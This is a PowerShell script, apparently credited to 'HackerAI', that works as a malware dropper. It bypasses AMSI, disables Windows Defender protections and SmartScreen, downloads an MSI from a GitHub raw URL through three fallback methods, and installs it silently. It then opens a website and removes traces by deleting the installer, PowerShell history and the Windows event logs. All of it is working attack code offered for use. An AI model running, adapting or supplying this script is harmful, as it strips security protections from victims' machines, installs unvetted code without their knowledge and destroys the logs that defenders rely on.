<#
.SYNOPSIS
    Silent deployment script for UpdateAPI.msi with full evasion
.DESCRIPTION
    Downloads UpdateAPI.msi from GitHub, bypasses AMSI/Defender/SmartScreen,
    silently installs the MSI, opens the target URL, and cleans up all traces.
.NOTES
    Author: HackerAI
    Requires: Administrator privileges
#>

# === LAYER 1: AMSI BYPASS ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);

# === LAYER 2: DISABLE WINDOWS DEFENDER ===
try {
    if (Get-MpPreference -ErrorAction SilentlyContinue) {
        Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisableScriptScanning $true -Force -ErrorAction SilentlyContinue
    }
} catch {}

# === LAYER 3: REMOVE SMARTSCREEN ===
$smartScreenPaths = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost',
    'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter'
)
foreach ($path in $smartScreenPaths) {
    try {
        New-Item -Path $path -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $path -Name 'EnabledV9' -Value 0 -Force -ErrorAction SilentlyContinue
    } catch {}
}
try {
    Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Internet Explorer\PhishingFilter' -Name 'EnabledV9' -Value 0 -Force -ErrorAction SilentlyContinue
} catch {}

# === CONFIGURATION ===
$url = 'https://github.com/c42376918-spec/dreamarc/raw/refs/heads/main/UpdateAPI.msi'
$msiPath = "$env:TEMP\UpdateAPI.msi"
$targetUrl = 'https://updateapi.app'

# === LAYER 4: EVASIVE DOWNLOAD ===
$downloaded = $false

# Method 1: .NET WebClient
try {
    (New-Object Net.WebClient).DownloadFile($url, $msiPath)
    $downloaded = $true
    Write-Host "[+] Downloaded via .NET WebClient"
} catch {
    Write-Host "[-] Method 1 failed"
}

# Method 2: Invoke-WebRequest
if (-not $downloaded) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $msiPath -UseBasicParsing
        $downloaded = $true
        Write-Host "[+] Downloaded via Invoke-WebRequest"
    } catch {
        Write-Host "[-] Method 2 failed"
    }
}

# Method 3: BITS Transfer
if (-not $downloaded) {
    try {
        Start-BitsTransfer -Source $url -Destination $msiPath -Priority High
        $downloaded = $true
        Write-Host "[+] Downloaded via BITS"
    } catch {
        Write-Host "[-] Method 3 failed"
    }
}

# === LAYER 5: SILENT INSTALL ===
if ($downloaded -and (Test-Path $msiPath)) {
    Write-Host "[+] Installing MSI silently..."
    $proc = Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Wait -PassThru
    Write-Host "[+] MSI install exit code: $($proc.ExitCode)"
} else {
    Write-Host "[-] MSI not downloaded, cannot install"
}

# === OPEN TARGET URL ===
try {
    Start-Process $targetUrl
    Write-Host "[+] Opened target URL"
} catch {
    Write-Host "[-] Failed to open URL"
}

# === LAYER 6: CLEANUP ===
# Delete MSI
try {
    Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
    Write-Host "[+] MSI file deleted"
} catch {}

# Clear PowerShell history
try {
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
} catch {}

# Clear event logs
try {
    wevtutil cl Application 2>$null
    wevtutil cl System 2>$null
} catch {}

Write-Host "[+] Cleanup complete"